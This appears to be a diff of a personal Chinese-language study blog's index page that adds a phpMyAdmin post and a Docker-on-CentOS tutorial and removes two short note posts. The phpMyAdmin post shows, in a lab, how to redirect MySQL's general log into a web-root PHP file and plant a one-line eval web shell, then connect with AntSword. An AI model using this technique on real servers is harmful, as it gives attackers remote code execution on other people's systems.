@@ -71,6 +71,178 @@
 
         <section id="main">
   
+    <article id="post-phpMyAdmin" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/22/phpMyAdmin/" class="article-date">
+  <time class="post-time" datetime="2023-11-22T09:00:44.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/22/phpMyAdmin/">phpMyAdmin</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="phpMyAdmin使用"><a href="#phpMyAdmin使用" class="headerlink" title="phpMyAdmin使用"></a>phpMyAdmin使用</h2><p>在浏览器的地址栏中输入：localhost&#x2F;phpMyAdmin&#x2F;，回车，就可以进入phpMyAdmin主界面了。</p>
+<p>show variables like ‘%general%’(查看是否开启全局日志记录)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122100304037.png" alt="image-20231122100304037"></p>
+<p>设置开启全局日志记录 set global general_log&#x3D;ON</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122100613103.png" alt="image-20231122100613103"></p>
+<p>set global general_log_file&#x3D;’C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;12.php’     将全局日志保存到12.php</p>
+<p>SELECT’<em><?phpinfo(); ?></em>‘     select查询 phpinfo返回php所有信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122152717224.png" alt="image-20231122152717224"></p>
+<p>在网页192.168.110.132&#x2F;12.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122150530446.png" alt="image-20231122150530446"></p>
+<p>SELECT<?php @eval($_POST[cmd]);?>添加一句话木马</p>
+<p>打开蚁剑，右键点击添加数据。</p>
+<p>输入<a target="_blank" rel="noopener" href="http://192.168.110.131/12.php">http://192.168.110.131/12.php</a></p>
+<p>链接码：cdm</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122171038082.png" alt="image-20231122171038082"></p>
+<p>保存，双击刚创建的地址。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231122171159226.png" alt="image-20231122171159226"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/22/phpMyAdmin/" data-id="clplzuha00009q8u403xv7dxc" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-在centos中使用docker" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/" class="article-date">
+  <time class="post-time" datetime="2023-11-21T08:08:26.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">21</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/">在centos7中下载及使用docker</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="下载docker并使用镜像和容器"><a href="#下载docker并使用镜像和容器" class="headerlink" title="下载docker并使用镜像和容器"></a>下载docker并使用镜像和容器</h2><p>（可以进入win10管理员模式远程连接centos7并进入其管理员模式：ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#49;&#48;&#x2e;&#x31;&#x33;&#49;">&#x72;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#49;&#48;&#x2e;&#x31;&#x33;&#49;</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yun update  (更新系统)</span><br><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">sudo yum-config-manager --add-repo http://mirrors.ustc.edu.cn/docker-ce/linux/centos/docker-ce.repo(添加yum)</span><br><span class="line">sudo yum install -y docker-ce</span><br></pre></td></tr></table></figure>
+
+<p>可以使用docker -v 查看docker是否下载</p>
+<p>在&#x2F;etc&#x2F;docker&#x2F;daemon.json文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json(进入)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在里面添加</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line">&#125;</span><br><span class="line">再 ctrl 加 ： 打开输入模式输入wq！（强制退出并保存）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121192119422.png" alt="image-20231121192119422"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">systemctl status docker(打开docker)</span><br><span class="line">docker pull mysql:5.7(下载mysql57)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121193103854.png" alt="image-20231121193103854"></p>
+<ul>
+<li><strong>更新docker版本</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">删除原本的docker</span><br><span class="line">yum erase docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-selinux \</span><br><span class="line">                  docker-engine-selinux \</span><br><span class="line">                  docker-engine \</span><br><span class="line">                  docker-ce</span><br><span class="line">下载</span><br><span class="line">yum install docker-ce -y</span><br></pre></td></tr></table></figure>
+
+<p>输入docker -v 查看docker版本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121193437411.png" alt="image-20231121193437411"></p>
+<p>输入docker images -a 查看所有镜像</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121194338577.png" alt="image-20231121194338577"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mysql57 -v mysql57:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d(如果3306已占用可改为3307)</span><br><span class="line"></span><br><span class="line">docker inspect mysql57</span><br><span class="line">docker exec -it mysql57 bash(进入容器)</span><br><span class="line">mysql -V (查看mysql57是否加进容器)</span><br><span class="line">exit(退出)</span><br><span class="line">docker pull phpmyadmin/phpmyadmin</span><br><span class="line">sudo docker run --name phpmyadmin --link mysql57:db -p 9998:80 -d phpmyadmin/phpmyadmin</span><br><span class="line">docker images(查看镜像是否有phpmyadmin/phpmyadmin)</span><br></pre></td></tr></table></figure>
+
+<p>登入网页192.168.110.131：9998进入网页，输入用户root，密码123456</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121195505684.png" alt="image-20231121195505684"></p>
+<h2 id="使用docker"><a href="#使用docker" class="headerlink" title="使用docker"></a>使用docker</h2><ul>
+<li><strong>docker基本命令</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker version    #查看docker版本</span><br><span class="line">docker cp --help  #帮助信息</span><br><span class="line">docker info       #查看docker系统</span><br><span class="line">docker stats      #查看docker的cpu</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>docker启动和停止</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker    #启动</span><br><span class="line">systemctl stop docker     #停止</span><br><span class="line">systemctl restart docker  #重启</span><br><span class="line">systemctl status docker   #查看docker服务状态</span><br><span class="line">systemctl enable docker   #设置开机启动docker服务</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>镜像命令</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker images                                 #查看本地存在的镜像</span><br><span class="line">docker images -a                              #查看所有镜像</span><br><span class="line">docker images -aq                             #查看所有镜像，只显示镜像id</span><br><span class="line">docker search mysql                           #在docker远程仓库搜索mysql的镜像</span><br><span class="line">docker search mysql--filter stars=3000        #在docker 远程仓库搜索mysql的镜像，且搜藏大于3000                                                的</span><br><span class="line">docker pull mysql                             #下载mysql镜像默认使用最新版的</span><br><span class="line">docker pull mysql:5.7                         #下载mysql 5.7版本的镜像</span><br><span class="line">docker rmi-f 镜像id                            #通过镜像id 删除镜像docker </span><br><span class="line">docker rmi -f $(docker images -aq)            #删除所有的镜像(递归删除)</span><br></pre></td></tr></table></figure>
+
+<p>REPOSITORY   镜像仓库源</p>
+<p>TAG                  镜像的标签</p>
+<p>IMAGE ID         镜像的id</p>
+<p>CREATED          镜像的创建时间</p>
+<p>SIZE 				  镜像的大小</p>
+<ul>
+<li><strong>容器命令</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看正在运行的容器docker ps</span><br><span class="line">#查看所有的容器docker ps -a</span><br><span class="line">#查看所有的容器,只显示容器的iddocker ps -aq</span><br><span class="line">#通过容器id 删除容器docker rm容器id</span><br><span class="line">#通过容器id 删除所有的容器docker rm -f $(docker ps -aq)</span><br><span class="line">#通过容器名字启动容器并进入到容器里docker run -it centos(容器名字)/bin/bash</span><br><span class="line">#从容器里退出，回到主机，且停止容器的运行exit</span><br><span class="line">#从容器里退出，回到主机，不停止容器的运行Ctrl + p +q</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>容器启动和停止</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#通过容器id 启动容器 docker start容器id</span><br><span class="line">#通过容器id重新启动容器 docker restart容器id</span><br><span class="line">#通过容器id 停止正在运行的容器 docker stop容器id</span><br><span class="line">#通过容器id 强制停止正在运行的容器 docker kill容器id</span><br><span class="line">#通过镜像的名字的以后台运行的方式进行启动(没有前台服务会停止) docker run -d centos</span><br><span class="line">#以后台方式启动nginx,起名 docker run -d --name nginx001 -p 80:8001 nginx</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>容器信息查看</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看容器的进程信息docker top容器id</span><br><span class="line">#查看容器的元数据(容器的具体信息)docker inspect容器id</span><br><span class="line">#进入正在运行的容器后开启一个新的终端，可以在里面操作docker exec -it 容器id /bin/bash</span><br><span class="line">#进入正在运行的容器后使用正在运行的终端，可以在里面操作docker attach容器id</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/" data-id="clplzuha3000fq8u47z7q2aj1" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
     <article id="post-安装centos7并搭建lamp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/11/20/%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E6%90%AD%E5%BB%BAlamp/" class="article-date">
@@ -181,41 +353,6 @@
 
 
   
-    <article id="post-未命名" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/11/17/%E6%9C%AA%E5%91%BD%E5%90%8D/" class="article-date">
-  <time class="post-time" datetime="2023-11-17T11:41:04.661Z" itemprop="datePublished">
-    <span class="post-month">11月</span><br/>
-    <span class="post-day">17</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231117093816213.png" alt="image-20231117093816213"></p>
-<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231117160148499.png" alt="image-20231117160148499"></p>
-<p>ps 显示进程</p>
-<p>kill -9 5003 杀掉进程</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/17/%E6%9C%AA%E5%91%BD%E5%90%8D/" data-id="clplzuha5000kq8u4eeis8umw" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
     <article id="post-kali-linux的目录结构" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/11/16/kali-linux%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/" class="article-date">
@@ -254,7 +391,7 @@
 <ul>
 <li>处理目录的常用命令</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ls（英文全拼：list files）: 列出目录及文件名</span><br><span class="line">cd（英文全拼：change directory）：切换目录</span><br><span class="line">pwd（英文全拼：print work directory）：显示目前的目录</span><br><span class="line">mkdir（英文全拼：make directory）：创建一个新的目录</span><br><span class="line">rmdir（英文全拼：remove directory）：删除一个空的目录</span><br><span class="line">cp（英文全拼：copy file）: 复制文件或目录</span><br><span class="line">rm（英文全拼：remove）: 删除文件或目录</span><br><span class="line">mv（英文全拼：move file）: 移动文件与目录，或修改文件与目录的名称</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls（英文全拼：list files）: 列出目录及文件名</span><br><span class="line">cd（英文全拼：change directory）：切换目录</span><br><span class="line">pwd（英文全拼：print work directory）：显示目前的目录</span><br><span class="line">mkdir（英文全拼：make directory）：创建一个新的目录</span><br><span class="line">rmdir（英文全拼：remove directory）：删除一个空的目录</span><br><span class="line">touch创建空文件</span><br><span class="line">cp（英文全拼：copy file）: 复制文件或目录</span><br><span class="line">rm（英文全拼：remove）: 删除文件或目录</span><br><span class="line">mv（英文全拼：move file）: 移动文件与目录，或修改文件与目录的名称</span><br></pre></td></tr></table></figure>
 
 <p>uname -a查看内核&#x2F;cpu信息</p>
 <p>ls列出目录的内容</p>
@@ -703,7 +840,7 @@
 <ul>
 <li>输入show options查看参数</li>
 </ul>
-<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231113200111129.png" alt="image-20231113200111129"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113200111129.png" alt="image-20231113200111129"></p>
 <ul>
 <li>输入run执行</li>
 </ul>
@@ -1092,51 +1229,6 @@
     </div>
     <footer class="article-footer">
       <a data-url="http://example.com/2023/11/08/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/" data-id="clplzuha4000hq8u4fcdyh5ge" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-虚拟机IPv4地址 ：192.168.0.41" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/11/08/%E8%99%9A%E6%8B%9F%E6%9C%BAIPv4%E5%9C%B0%E5%9D%80%20%EF%BC%9A192.168.0.41/" class="article-date">
-  <time class="post-time" datetime="2023-11-08T08:16:57.547Z" itemprop="datePublished">
-    <span class="post-month">11月</span><br/>
-    <span class="post-day">08</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>虚拟机IPv4地址 ：192.168.0.41</p>
-<p>子网掩码：255.255.255.0</p>
-<p>默认网关：192.168.0.1</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231108154538885.png" alt="image-20231108154538885"></p>
-<p>私有地址范围：</p>
-<p>10.0.0.0</p>
-<p>172.16.0.0 - 172.31.255.255</p>
-<p>192.168.0.0 - 192.168.255.255</p>
-<p>树型拓扑结构</p>
-<p>三层结构模型:</p>
-<p>接入层：无线网络发射器，AP</p>
-<p>汇聚层：楼层交换机</p>
-<p>核心层</p>
-<p>三种网卡</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/08/%E8%99%9A%E6%8B%9F%E6%9C%BAIPv4%E5%9C%B0%E5%9D%80%20%EF%BC%9A192.168.0.41/" data-id="clplzuha6000mq8u4aq4bbrtg" class="article-share-link">分享</a>
       
       
     </footer>
